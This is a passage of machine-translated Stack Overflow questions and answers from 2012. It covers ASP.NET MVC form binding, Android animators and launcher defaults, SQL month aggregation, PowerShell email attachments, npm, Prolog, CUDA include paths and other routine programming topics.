发生的情况是，当 IE 验证页面的安全性时，它错误地将页面中的相对 URL 与`about:blank`URL 组合在一起，导致 URL 像`about:/myimage.jpg`警告。

您可以在此处查看有关此错误的另一个讨论：[由于背景图像而避免 IE 中的“混合内容”警告的确切规则是什么？](https://stackoverflow.com/questions/6961760/what-exactly-are-the-rules-for-avoiding-the-mixed-content-warning-in-ie-due-to)

那里描述的解决方案是使您的所有 URL 成为绝对 URL，包括完整的域和协议。

我希望这会有所帮助。

# asp.net - 使用 MVC .NET 从 HTML 表单对发布的数组进行分组

> ID：13167571
> 
> 赞同：1
> 
> 时间：2012-10-31T21:17:41.533
> 
> 标签：asp.net, html, asp.net-mvc, forms, post

我正在使用 ASP.NET MVC 开发一个非常灵活的 HTML 表单。我有一个“数量”输入元素，它稍后在表单中动态创建 [其值] 输入元素集。

例如，如果数量设置为 1，我有一组用于用户名、房间号和建筑物名称的文本框。但是如果 Quantity 设置为 10，则每个文本框都会出现 10 个。

显然，当数据回传到服务器时，我需要正确地将每个用户名、房间和建筑物分组在一起，而不是让它们混乱。

似乎最简单的方法是使每个集合都相同：

```
<input type="text" name="username"/>
<input type="text" name="room"/>
<select name="building">                           <!--All this x Quantity-->
   <option value="TARDIS">TARDIS</option>
   <option value="USS Enterprise">USS Enterprise</option>
</select>

<input type="text" name="username"/> <!--And so on...--> 
```

然后相信 POST 字符串将保留元素在 HTML 中写入的顺序，从而允许我在将这些值捕获到数组中后在`usernames[0]`服务器`rooms[0]`上`buildings[0]`回复相等索引的其他条目。

这是否在 100% 的时间内有效？安全吗？我可以想出一些方法来在输入组之间建立严格的关联，但它们涉及到一些轻微刺激性的 javascript 和一些非常令人讨厌的 C#。这似乎可以开箱即用。诶？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-31T21:29:04.513

构建您的表单可以映射到的模型

```
public class PostedModel
{
 public List<DataGroup> PostedData { get; set; }
}

public class DataGroup
{
 public string username { get; set; }
 public string room { get; set; }
 public string? building { get; set; }//nullable because this is bound do a dropdownlist
} 
```

在您的表格中，符合模型

```
<!-- Input Set 0 -->
<input type="text" name="PostedData[0].username"/>
<input type="text" name="PostedData[0].room"/>
<select name="PostedData[0].building">
 <option value="TARDIS">TARDIS</option>
 <option value="USS Enterprise">USS Enterprise</option>
</select>

<!-- Input Set 1 -->
<input type="text" name="PostedData[1].username"/>
<input type="text" name="PostedData[1].room"/>
<select name="PostedData[1].building">
 <option value="TARDIS">TARDIS</option>
 <option value="USS Enterprise">USS Enterprise</option>
</select>

<!-- Input Set 2 -->
<input type="text" name="PostedData[2].username"/>
<input type="text" name="PostedData[2].room"/>
<select name="PostedData[2].building">
 <option value="TARDIS">TARDIS</option>
 <option value="USS Enterprise">USS Enterprise</option>
</select> 
```

自动将帖子绑定到您之前创建的模型

```
[HttpPost]
public ActionResult PostedAction ( PostedModel model )
{
 //use the data
 for( DataGroup curr in model.PostedData )
 {
   curr.username
   curr.room
   curr.building.Value //.Value because it was set to nullable with the ?
 }
 return RedirectToAction("BaseAction");//Post-Redirect-Get pattern
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-31T21:25:50.327

Phil Haack 很好地解释了输入字段的预期名称，以便将它们绑定到[`this blog post`](http://haacked.com/archive/2008/10/23/model-binding-to-a-list.aspx). 所以你所要做的就是尊重这个约定。您可能还会发现[`following blog post`](http://blog.stevensanderson.com/2010/01/28/editing-a-variable-length-list-aspnet-mvc-2-style/)Steven Sanderson 的文章很有趣，因为他解释了如何在实践中实现此场景。在他的示例中，他正在使用添加/删除项目按钮，但这可以很容易地转换到您在文本框中输入要添加的项目数量的场景。

# android - 为什么在动画监听器中调用 .cancel() 会导致 StackOverflowError？

> ID：13167576
> 
> 赞同：1
> 
> 时间：2012-10-31T21:18:02.097
> 
> 标签：android, animation, graphics

有什么原因我不能在动画监听器中提供的 Animator 上调用 .cancel() 吗？

当我执行以下代码时，我得到一个 StackOverflowError：

```
 animation.addListener(new ValueAnimator.AnimatorListener() {
            @Override
            public void onAnimationStart(Animator animator) {
                if (!showCircles)
                    animator.cancel();
            }
        .... 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-22T04:23:41.670

我发现了一个解决方案。

我发现你必须先打电话`animator.removeAllListeners();`，然后再打电话`animator.cancel();`。（对于大多数所有 4.0+ 设备都是如此，但在 GSIII 上，出于某种原因，您不需要。）

由于某种原因，该`cancel()`命令导致`onAnimationStart`再次被触发（以无限循环结束）。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-31T22:05:41.927

我认为即使您取消了动画制作者，听众仍在监听该事件。

我不完全确定这是否可行，但您可以尝试添加：

if(animator != null) { animator.cancel(); }

我希望这有帮助

射频

# sql - SQL将月份添加到没有日历表的查询

> ID：13167577
> 
> 赞同：2
> 
> 时间：2012-10-31T21:18:02.727
> 
> 标签：sql

我在这里有一个非常简单的表：

* * *

**表**
1 ID
日期
1 日期 2
日期 3

* * *

我想按月份和ID汇总数据，所以查询结果如下：

* * *

**查询table1**
ID
月份的结果
Date1 非空月份的计数 Date2 非空
月份的计数 Date3 非空月份的
计数

* * *

我目前在下面有这个查询，根据@month 指定的内容仅拉一个月：

```
Select ID, @month as [Month]  
Sum((Case When Month(Date1)=@month then 1 else 0 END)) as [Date1 Count],   
Sum((Case When Month(Date2)=@month then 1 else 0 END)) as [Date2 Count],  
Sum((Case When Month(Date3)=@month then 1 else 0 END)) as [Date3 Count],  
From Table1  
Group by ID 
```

但是我想提取**所有 12 个月**，但是数据库没有月份表或日历表，我如何创建一个查询，该查询将包括每个 ID 的所有 12 个月并获取 Date1、Date2 和 Date3 的相应月度计数? 顺便说一句，许多条目的日期之一为空，例如 Date1 和 Date3 = Null 而 Date2 = '01/01/2008'。提前致谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-31T21:31:13.447

由于只有 12 个月并且永远不会改变，因此使用 CTE 或子查询来生成月份数字很简单：

```
;with M as (
  select 1 as month union
  select 2 union
  select 3 union
  select 4 union
  select 5 union
  select 6 union
  select 7 union
  select 8 union
  select 9 union
  select 10 union
  select 11 union
  select 12
)
Select ID, M.Month,
Sum((Case When Month(Date1)=M.Month then 1 else 0 END)) as [Date1 Count],   
Sum((Case When Month(Date2)=M.Month then 1 else 0 END)) as [Date2 Count],  
Sum((Case When Month(Date3)=M.Month then 1 else 0 END)) as [Date3 Count]  
From M,Table1
Group by ID,M.month 
```

演示：[http ://www.sqlfiddle.com/#!3/19ed6b/1](http://www.sqlfiddle.com/#!3/19ed6b/1)

# java - 在安卓中打开文件

> ID：13167579
> 
> 赞同：0
> 
> 时间：2012-10-31T21:18:05.060
> 
> 标签：java, android, android-intent, android-sdcard, android-file

我正在使用以下代码从 sd 卡中浏览和选择文件。

```
Intent intent = new Intent(Intent.ACTION_GET_CONTENT);
intent.setType("file/*");
startActivityForResult(intent,PICKFILE_RESULT_CODE); 
```

当用户选择一个文件时，我正在使用这行代码获取它的路径

```
String picturePath = data.getData().getPath(); 
```

但是当我尝试使用下面的代码打开这个文件时，我得到了 file not found 异常

```
InputStream inputStream = getContentResolver().openInputStream( Uri.fromFile(new File(picturePath))); 
```

我将其作为所选文件的路径

```
/external/images/media/36 
```

我怎么能在android中做到这一点？

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-31T21:47:20.763

你试过了吗：

```
InputStream inputStream = getContentResolver().openInputStream(data.getData()); 
```

或者，如果您想使用文件：

[http://developer.android.com/reference/java/io/FileInputStream.html](http://developer.android.com/reference/java/io/FileInputStream.html)

一定要使用`getAbsolutePath()`而不是`getPath()`;

# email - 带有多个附件的电子邮件

> ID：13167580
> 
> 赞同：7
> 
> 时间：2012-10-31T21:18:07.530
> 
> 标签：email, powershell, email-attachments, attachment

我正在为帮助台开发 PowerShell 脚本，以便在将 userhome 文件夹从服务器迁移到 NAS 设备时使用。帮助台用户将用户名输入到“userhomelist.txt”文件中。

我的问题是我无法让脚本附加所有日志文件。只有最后一个日志文件附加到电子邮件。我想我需要为多个附件使用一个字符串，但我一直在想还有另一种方法。

```
#----- STEP #1 retrieve contents of input file ---#
$INPUTFILEPATH = 'c:\temp\userhomelist.txt'

#----- read input file contents ----#
$inputdata = Get-Content $INPUTFILEPATH

#----- Top section of email body ----#
$msgreport = new-object Net.Mail.MailMessage 
$msgreport = "To view log files, go to directory where this PowerShell Script was run from. `r"
$msgreport = $msgreport + "`r`n"

#read in each username
foreach ($username in $inputdata)
{

#----- STEP #2 robocopy files from \\server to \\nasdevice location ----#
Start-Process -FilePath robocopy -ArgumentList "\\server\userhomes\$username \\nasdevice\userhomes\$username /mir /sec /r:1 /w:1 /tee /NP /Z /log+:userhome-move-$username.log"
$file = "c:\temp\userhome\userhome-move-$username.log"
$msgreport = $msgreport + "$username robocopy has been completed." + "`n"

##----- STEP #3 change file and directory ownership to user ----#
Start-Process -FilePath subinacl -ArgumentList "/subdirectories \\nasdevice\userhomes\$username\*.* /setowner=$username"
$msgreport = $msgreport + "$username file and directory ownership changes have been completed." + "`n"
$msgreport = $msgreport + "`r`n"
}

#----- Email Results ----#
$SmtpClient = new-object system.net.mail.smtpClient
$MailMessage = New-Object system.net.mail.mailmessage 
$SmtpServer = "emailserver.business.com"
$SmtpClient.host = $SmtpServer 
$MailMessage.From = "userhome-migration@business.com"
$MailMessage.To.add("helpdeskn@business.com")
$MailMessage.Subject = "User migrations"
$MailMessage.IsBodyHtml = 0
$MailMessage.Body = $msgreport
$MailMessage.Attachments.Add($file)
$SmtpClient.Send($MailMessage) 
```

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-10-31T21:40:43.693

[`send-mailmessage`](http://technet.microsoft.com/en-us/library/hh849925.aspx)如果您使用的是 powershell v2 或 v3，我建议使用cmdlet。它有一个`-attachments`接受字符串数组的参数 ( `string[]`)。

您可以像在用户循环之前一样更改`$file`声明它的变量。在 foreach 里面做：`$file = @()``foreach`

```
$file += "c:\temp\userhome\userhome-move-$username.log" 
```

更改`$msgreport`为`[string]`类型

然后使用`send-mailmessage`cmdlet 执行以下操作：

```
send-mailmessage -SmtpServer "emailserver.business.com"  `
-From "userhome-migration@business.com" -to "helpdeskn@business.com" `
-Subject "User migrations" -BodyAsHtml -Body $msgreport -Attachments $file 
```

# java - 清除和设置默认家庭应用程序

> ID：13167583
> 
> 赞同：33
> 
> 时间：2012-10-31T21:18:19.760
> 
> 标签：java, android, launcher

Nova到底是如何管理这个的？我实际上是在尝试做同样的事情：为用户提供一个按钮来清除并选择他们的新默认启动器。

我能够获取默认应用名称并显示它：

```
 private String getPrefered(Intent i) {
       PackageManager pm = this.getActivity().getPackageManager();
       final ResolveInfo mInfo = pm.resolveActivity(i, 0);
       return (String) pm.getApplicationLabel(mInfo.activityInfo.applicationInfo);
   } 
```

`Intent i`在哪里

```
Intent home = new Intent("android.intent.action.MAIN");
        home.addCategory("android.intent.category.HOME"); 
```

然后我调用系统ResolveActivity，

```
private void makePrefered() {
       Intent selector = new Intent("android.intent.action.MAIN");
       selector.addCategory("android.intent.category.HOME");                          
       selector.setComponent(new ComponentName("android", "com.android.internal.app.ResolverActivity"));
       startActivity(selector);
   } 
```

选择器出现并正常运行，但实际上并没有设置或清除任何值。在调试它时，似乎我错过了一些额外的东西？当我调用该`makePrefered`方法时，我收到以下日志消息，

```
I/ActivityManager(  602): START {act=android.intent.action.MAIN cat=[android.intent.category.HOME] cmp=android/com.android.internal.app.ResolverActivity u=0} from pid 22641 
```

但是，当我使用 Nova 实现时，我看到了所有这些，

```
 I/PackageManager(  602): Result set changed, dropping preferred activity for Intent { act=android.intent.action.MAIN cat=[android.intent.category.HOME] flg=0x10200000 (has extras) } type null
I/ActivityManager(  602): START {act=android.intent.action.MAIN cat=[android.intent.category.HOME] flg=0x10200000 cmp=android/com.android.internal.app.ResolverActivity (has extras) u=0} from pid 22905
I/ActivityManager(  602): START {act=android.intent.action.MAIN cat=[android.intent.category.HOME] flg=0x10200000 cmp=com.mycolorscreen.canvas/.Launcher (has extras) u=0} from pid 22905 
```

1.  我怎样才能进入那里并查看与该捆绑包一起发送的内容？
2.  我怎样才能清除首选应用程序？不要告诉我你不能，我已经看过足够多的答案了。Nova 做到了，而且完全按照我的意愿去做。

* * *

## 回答 #1

> 赞同：62
> 
> 时间：2012-11-05T20:18:26.237

执行此操作的代码实际上只是一个非常聪明的解决方法。

当一个组件与

```
 <category android:name="android.intent.category.HOME" /> 
```

启用，通常从安装新的家庭应用程序开始，默认家庭应用程序将被清除。

通过像这样使用 home 组件创建一个空活动来利用这一点。

```
<activity
            android:name="com.t3hh4xx0r.haxlauncher.FakeHome"
            android:enabled="false">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.HOME" />
                <category android:name="android.intent.category.DEFAULT" />
            </intent-filter>
        </activity> 
```

当你想设置你的新默认值时，你启用这个组件，然后调用 home 意图，然后再次禁用你的假 home 组件。

```
public static void makePrefered(Context c) {
       PackageManager p = c.getPackageManager();
       ComponentName cN = new ComponentName(c, FakeHome.class);
       p.setComponentEnabledSetting(cN, PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP);

       Intent selector = new Intent(Intent.ACTION_MAIN);
       selector.addCategory(Intent.CATEGORY_HOME);            
       c.startActivity(selector);

       p.setComponentEnabledSetting(cN, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
   } 
```

最终结果是系统认为安装了新的家庭应用程序，因此清除默认设置，允许您在没有特殊权限的情况下设置您的应用程序。

感谢 TeslaCoil 和 NovaLauncher 的 Kevin 提供有关此操作的信息！

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2015-01-15T08:36:45.803

r2DoesInc 的解决方案不适用于我的 4.2.2 测试设备。
我的解决方案：禁用然后重新启用我的应用程序的 HomeActivity，它不必创建`FakeHome`

```
PackageManager p = getPackageManager();
ComponentName cN = new ComponentName(this, HomeActivity.class);
p.setComponentEnabledSetting(cN, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
startActivity(new Intent(Intent.ACTION_MAIN).addCategory(Intent.CATEGORY_HOME));
p.setComponentEnabledSetting(cN, PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP); 
```

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2015-08-22T00:24:41.130

我在 Android 4.1.2 上使用以下代码，并在工业平板电脑上使用平台签名的信息亭模式应用程序。它使用 deprecated `PackageManager.addPreferredActivity()`，但优点是无需用户交互即可工作。它甚至可以在使用“始终”选项选择标准 Android 启动器后工作。

```
// Requires permission SET_PREFERRED_APPLICATIONS.
public static boolean setPreferredHomeActivity (Context context, String packageName, String className) {
   ComponentName oldPreferredActivity = getPreferredHomeActivity(context);
   if (oldPreferredActivity != null && packageName.equals(oldPreferredActivity.getPackageName()) && className.equals(oldPreferredActivity.getClassName())) {
      return false; }
   if (oldPreferredActivity != null) {
      context.getPackageManager().clearPackagePreferredActivities(oldPreferredActivity.getPackageName()); }
   IntentFilter filter = new IntentFilter(Intent.ACTION_MAIN);
   filter.addCategory(Intent.CATEGORY_HOME);
   filter.addCategory(Intent.CATEGORY_DEFAULT);
   ComponentName[] currentHomeActivities = getActivitiesListByActionAndCategory(context, Intent.ACTION_MAIN, Intent.CATEGORY_HOME);
   ComponentName newPreferredActivity = new ComponentName(packageName, className);
   context.getPackageManager().addPreferredActivity(filter, IntentFilter.MATCH_CATEGORY_EMPTY, currentHomeActivities, newPreferredActivity);
   return true; }

private static ComponentName getPreferredHomeActivity (Context context) {
   ArrayList<IntentFilter> filters = new ArrayList<>();
   List<ComponentName> componentNames = new ArrayList<>();
   context.getPackageManager().getPreferredActivities(filters, componentNames, null);
   for (int i = 0; i < filters.size(); i++) {
      IntentFilter filter = filters.get(i);
      if (filter.hasAction(Intent.ACTION_MAIN) && filter.hasCategory(Intent.CATEGORY_HOME)) {
         return componentNames.get(i); }}
   return null; }

private static ComponentName[] getActivitiesListByActionAndCategory (Context context, String action, String category) {
   Intent queryIntent = new Intent(action);
   queryIntent.addCategory(category);
   List<ResolveInfo> resInfos = context.getPackageManager().queryIntentActivities(queryIntent, PackageManager.MATCH_DEFAULT_ONLY);
   ComponentName[] componentNames = new ComponentName[resInfos.size()];
   for (int i = 0; i < resInfos.size(); i++) {
      ActivityInfo activityInfo = resInfos.get(i).activityInfo;
      componentNames[i] = new ComponentName(activityInfo.packageName, activityInfo.name); }
   return componentNames; } 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2019-09-06T20:01:27.177

进一步采用@Bruce 的回答（不使用虚假主页活动），您可以使用 PackageManager.setComponentEnabledSetting 首先禁用组件，然后为主页意图使用 resolveActivity（而不是使用 startActivity），然后启用组件，然后使用意图启动活动。

```
Intent homeIntent = new Intent(Intent.ACTION_MAIN).addCategory(Intent.CATEGORY_HOME);
PackageManager pm = getPackageManager();
ResolveInfo rInfo = pm.resolveActivity(homeIntent, PackageManager.MATCH_DEFAULT_ONLY);

if (!rInfo.activityInfo.packageName.equals(getPackageName())) { // your app is not the default HOME

    ComponentName cn = <ComponentName object of your home activity>

    pm.setComponentEnabledSetting(cn, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
    pm.resolveActivity(homeIntent, PackageManager.MATCH_DEFAULT_ONLY);
    pm.setComponentEnabledSetting(cn, PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP);
    startActivity(homeIntent);
} 
```

# jquery - 验证所有表单输入都有类

> ID：13167584
> 
> 赞同：1
> 
> 时间：2012-10-31T21:18:19.933
> 
> 标签：jquery, forms, class, input

我试图弄清楚如何检查特定表单中的所有输入元素是否具有某个类，如果可能的话，不单独检查每个元素。

我知道如何检查单个元素是否有一个类..

```
if( $('#element').hasClass('class') ){ Do This...} 
```

我也知道如何用一行 JQuery 来影响表单的所有输入。

```
$('#form > *').on('click', function(){ Do This...}); 
```

我似乎无法将两者融合在一起......就像......

```
if( $('#form > *').hasClass('class') ){ Do This...} 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-10-31T21:21:02.643

只需检查表单中的输入数是否等于所需类的表单中的输入数：

```
var allHaveClass = $('#form input').length == $('#form input.yourclass').length; 
```

在这里，有一个小提琴：http: [//jsfiddle.net/adrianonantua/2GnaW/](http://jsfiddle.net/adrianonantua/2GnaW/)

**更新**

另一种方法：检查表单中是否有任何不包含 yourclass 的输入。

```
var allHaveClass = $('#form input:not(.yourclass)').length == 0; 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-31T21:21:10.310

您可以执行以下操作：

```
$("#form input").not('.theclass') 
```

这将返回任何不具有该类的输入元素。

另一种方法是：

```
$("#form input:not(.theclass)") 
```

后者似乎具有更好的性能。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-10-31T21:21:49.370

最简单的方法是一个简单的`if`声明：

```
var form = $(formSelector);

if (form.find('input').length == form.find('input.className').length) {
    // all inputs have that class
} 
```

# node.js - “-g”标志在命令“npm install -g”中有什么作用 “？

> ID：13167588
> 
> 赞同：63
> 
> 时间：2012-10-31T21:18:36.873
> 
> 标签：node.js, npm

我正在关注使用`-g`时使用标志的示例，`npm install`但我无法通过帮助系统弄清楚`-g`标志在做什么。

* * *

## 回答 #1

> 赞同：63
> 
> 时间：2012-10-31T21:19:55.467

`-g`告诉`npm`安装命名模块，以便全局访问它。

但重要的是要了解它`-g`通常仅用于提供命令行实用程序的包，以便它们的可执行组件在系统中可用`PATH`。

如果您有多个程序`require`具有相同的软件包，则每个程序都应在本地安装该软件包。如果您真的想通过全局安装来共享已安装的软件包，您还必须使用`npm link`.

[在此处](https://docs.npmjs.com/getting-started/installing-npm-packages-globally)查看有关全局安装包主题的文档。

* * *

## 回答 #2

> 赞同：15
> 
> 时间：2012-10-31T21:23:51.763

如果你这样做`npm help install`，你会看到：

> ```
>  o   npm install (in package directory, no arguments):
> 
>       Install the dependencies in the local node_modules folder.
> 
>       In global mode (ie, with -g or --global appended  to  the  com-
>       mand), it installs the current package context (ie, the current
>       working directory) as a global package. 
> ```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-10-31T21:24:15.570

以[express 模块](http://expressjs.com/)为例。如果之前使用 -g 选项安装它，您可以`express`在任何地方编写，以创建骨架应用程序。

# android - jQuery mobile + phonegap 选择元素显示选项很慢

> ID：13167589
> 
> 赞同：4
> 
> 时间：2012-10-31T21:18:39.310
> 
> 标签：android, html, ios, cordova, jquery-mobile

我正在为 Android/iOS 开发一个 jQuery mobile + phonegap 移动应用程序。但是我在 Android 上的选择元素有问题。单击它时，大约需要 5 秒钟才能显示选项。我注意到在其他具有较少 HTML 元素或 iOS 的页面上不需要这么长时间。

有没有办法可以加快这个过程？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-02T19:44:42.260

可能是这个问题：

> **$.mobile.buttonMarkup.hoverDelay**
> 
> 如果您发现按钮向下/悬停状态（列表、按钮、链接等）感觉迟缓，则可能使用 $.mobile.buttonMarkup.hoverDelay 设置。它将减少触摸事件和相关类的应用之间的时间，但也会导致即使在用户滚动时（例如，在长链接列表上），应用相同类的机会也更高。
> 
> [http://jquerymobile.com/demos/1.2.0/docs/pages/phonegap.html](http://jquerymobile.com/demos/1.2.0/docs/pages/phonegap.html)

# prolog - Prolog (SICStus) findall 中的错误

> ID：13167590
> 
> 赞同：0
> 
> 时间：2012-10-31T21:18:47.713
> 
> 标签：prolog, prolog-findall

我在序言程序中有问题。错误出现在谓词 findall 内的谓词移动中。任何人都知道我为什么会收到此错误：

！>= /2 的参数 1 中的实例化错误！目标：_1123>=0 % 1

代码如下：

```
moves(Board, Player, BoardList) :-
  change_player(Player, Opposing),
  \+winners(Board, Player, Opposing),
  findall(NewBoard,
          (
            find_piece(Board, Player, 0, 0, XPiece, YPiece),
            get_piece(Board, XPiece, YPiece, Piece),
            validate_move(Board, XPiece, YPiece, XFinal, YFinal, Player,Piece,FinalPiece),
            move(Board, XPiece, YPiece, XFinal, YFinal, Player,Piece,FinalPiece, NewBoard)
          ),
          BoardList).

find_piece([], _, _, _, _, _) :- fail.

find_piece([[piece(_,_,Player)|_]|_], Player, XPiece, YPiece, XPiece, YPiece).

find_piece([[]|Row], Player, _, YCoord, XPiece, YPiece) :-
  NewYCoord is YCoord + 1,
  find_piece(Row, Player, 0, NewYCoord, XPiece, YPiece).

find_piece([[_|Column]|Row], Player, XCoord, YCoord, XPiece, YPiece) :-
  NewXCoord is XCoord + 1,
  find_piece([Column|Row], Player, NewXCoord, YCoord, XPiece, YPiece).

% get_piece/4
% get an piece from board
get_piece(Board, X, Y, Element) :-
  validate_coord(X, Y),
  get_from_board(Board, Y, Row),
  get_from_board(Row, X, Element).

% get_from_board/3
% get something from a certain position of the board
get_from_board([Head|_],0,Head).

get_from_board([Head|Tail],Pos,Elem):-
  Pos \= 0,
  NewPos is Pos - 1,
  get_from_board(Tail,NewPos,Elem).

validate_move(Board,XPiece,YPiece,XPiece,YFinal,Player,Piece,FinalPiece):-
  validate_coord(XPiece,YFinal),
  get_movement_y(YPiece,YFinal),
  piece(_,_,Player)=Piece,
  get_piece(Board,XPiece,YFinal,Elem),
  FinalPiece=Elem,
  piece(_,Value,_)=Piece,
  Value > 0,
  Value < 11,
  \+(piece(_,_,Player)=Elem).

validate_move(Board,XPiece,YPiece,XFinal,YPiece,Player,Piece,FinalPiece):-
  validate_coord(XFinal,YPiece),
  get_movement_x(XPiece,XFinal),
  piece(_,_,Player)=Piece,
  get_piece(Board,XFinal,YPiece,Elem),
  FinalPiece=Elem,
  piece(_,Value,_)=Piece,
  Value > 0,
  Value < 11,
  \+(piece(_,_,Player)=Elem).

% get_movement_y/2
% get and correct the move in y

get_movement_y(YPiece,YDesired):-
  ((YDesired > YPiece )-> (YDesired is YPiece+1)
             ;(YDesired is YPiece -1)).

% get_movement_x/2
% get and correct the move in x
get_movement_x(XPiece,XDesired):-
  ((XDesired > XPiece )-> (XDesired is XPiece+1)
             ;(XDesired is XPiece -1)).

% move/8
% True if NewBoard is the resulting board if the piece belonging to Player
% at (XPiece, YPiece) gets moved to (XFinal, YFinal) in Board
move(Board, XPiece, YPiece, XFinal, YFinal, Player,Piece,piece('   ',12, blk),NewBoard) :-
  get_from_board(Board, YFinal, TempRowFinal),
  set_element_at_index(TempRowFinal, XFinal, Piece, NewRowFinal),
  set_element_at_index(Board, YFinal, NewRowFinal, TempBoard),

  get_from_board(TempBoard, YPiece, TempRowPiece),
  set_element_at_index(TempRowPiece, XPiece, piece('   ',12,blk), NewRowPiece),
  set_element_at_index(TempBoard, YPiece, NewRowPiece, NewBoard).

validate_coord(X, Y) :- 
  X >= 0, 
  X < 10, 
  Y >= 0, 
  Y < 10, 
  \+(forbiden_area(X,Y)).

move(Board, XPiece, YPiece, XFinal, YFinal, Player,Piece,FinalPiece,NewBoard) :-

  clear_screen,
  write('######### CONFRONTO EM CURSO #########'),nl,nl,
  show_battle(Board,XFinal,YFinal,Player,0,0),
  sleep(2),
  clear_screen,
  move_battle(Piece,FinalPiece,PieceToUse),
  get_from_board(Board, YFinal, TempRowFinal),
  set_element_at_index(TempRowFinal, XFinal, PieceToUse, NewRowFinal),
  set_element_at_index(Board, YFinal, NewRowFinal, TempBoard),

  get_from_board(TempBoard, YPiece, TempRowPiece),
  set_element_at_index(TempRowPiece, XPiece, piece('   ',12,blk), NewRowPiece),
  set_element_at_index(TempBoard, YPiece, NewRowPiece, NewBoard). 
```

# c# - 在 Visual Studio 2010 中调试控制台应用程序时的极端内存使用情况

> ID：13167591
> 
> 赞同：1
> 
> 时间：2012-10-31T21:18:54.300
> 
> 标签：c#, visual-studio-2010, .net-4.0

好的，伙计们，这个让我发疯了。我有通过连接到相当大的第三方 Web 服务（12000 行和 530k）自动生成的类。当我在*控制台应用程序中**调试*时实例化这些类时，我可以看到 devenv.exe 进程的内存占用量迅速膨胀到 3GB。

 *如果我从命令行运行应用程序，则没有问题；devenv.exe 中甚至都没有。如果我在 Web 应用程序中实例化类，无论我是否处于调试模式，也没有问题。

更奇怪的是，我发现，在控制台应用程序上重现该问题后，在同一解决方案中的任何 Web 应用程序上，问题会突然开始发生在非常罕见的情况下（我今天测试了 50 次中的两次）。这很容易通过打开解决方案属性并将配置从 Debug 切换到 Release 然后回到 Debug 来解决（这需要一些摆弄和愚蠢的运气才能发现）。

令人发指的是，这似乎只发生在**一**台机器上，所以我认为这个问题是操作系统或 VS 中的环境问题。我已将所有 VS 设置重置为默认值，但没有运气。

这台机器*是*唯一安装了 VS 2012 的机器（认为它很少被使用，而且这个解决方案从未被它打开过）所以我现在想知道这是否可能是罪魁祸首。

我的下一步将是卸载/重新安装 VS2012 以查看会发生什么，但我想提出这个问题，看看是否有人想到了一些我没有想到的简单事情。

编辑：我在 Win7 Pro SP1 64 位上运行 VS2010 Pro SP1 32 位。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-02T07:48:30.030

试图关闭 Intellitrace？在大型解决方案的情况下，它可能会导致沉重的内存负载。*

# c - 错误：cuda_runtime.h：没有这样的文件或目录

> ID：13167598
> 
> 赞同：18
> 
> 时间：2012-10-31T21:19:26.657
> 
> 标签：c, gcc, cuda, nvcc

如何强制 gcc 在 /usr/cuda/local/include 中查找 cuda_runtime.h？

我正在尝试使用 C 包装器编译 CUDA 应用程序。我正在运行 Ubuntu 10.04。

我已使用以下命令成功地将我的 CUDA 应用程序编译为 .so：

```
nvcc -arch=sm_11 -o libtest.so --shared -Xcompiler -fPIC main.cu 
```

当我尝试使用以下命令编译我的 c 包装文件时：

```
gcc -std=c99 -o main -L. -ltest main.c 
```

我收到错误：

```
error: cuda_runtime.h: No such file or directory 
```

我已经验证 cuda_runtime.h 实际上存在于 /usr/local/cuda/include

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2017-04-13T10:00:13.497

如果您使用的是 CMake

```
find_package(CUDA  REQUIRED)
include_directories("${CUDA_INCLUDE_DIRS}") 
```

* * *

## 回答 #2

> 赞同：10
> 
> 时间：2012-10-31T21:45:55.737

使用 -I 开关允许 gcc 找到 cuda_runtime.h 文件：

```
gcc -std=c99 -I/usr/local/cuda/include -o main -L. -ltest main.c 
```

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2019-11-22T14:17:46.907

我们正在使用 CMake，但它仍然无法找到头文件（可能是 CMake 版本找不到目录`./targets/x86_64-linux/include`，或者因为我们有多个 CUDA 版本）。为我们设置[`CPATH`](https://unix.stackexchange.com/questions/409061/define-include-directory-path-for-h-centos)和`LD_LIBRARY_PATH`修复它：

```
export CPATH=/usr/local/cuda-10.1/targets/x86_64-linux/include:$CPATH
export LD_LIBRARY_PATH=/usr/local/cuda-10.1/targets/x86_64-linux/lib:$LD_LIBRARY_PATH
export PATH=/usr/local/cuda-10.1/bin:$PATH 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2018-07-06T05:46:21.813

添加`-isystem /usr/local/cuda-8.0/include`到 flags.make 文件中的 CXX_INCLUDES。

# javascript - 这是如何工作的：使用 for 循环查找数组中的最大数

> ID：13167600
> 
> 赞同：2
> 
> 时间：2012-10-31T21:19:31.227
> 
> 标签：javascript

好吧，我不仅喜欢记住代码块，还喜欢理解它们，这样我就可以自己创建它们。为什么这行得通？我不明白。如果有人可以向我解释，我将不胜感激。对我来说，它看起来像：“如果数组索引（数组中的位置）大于 0，0 = 数组索引，”以及它如何神奇地告诉我数组中的最高数字我没有一个线索。我试过寻找答案，但没有运气。这是代码示例，在此先感谢：

```
var array = [3, 4, 5, 21.15, 21, 9];
var largest = 0;

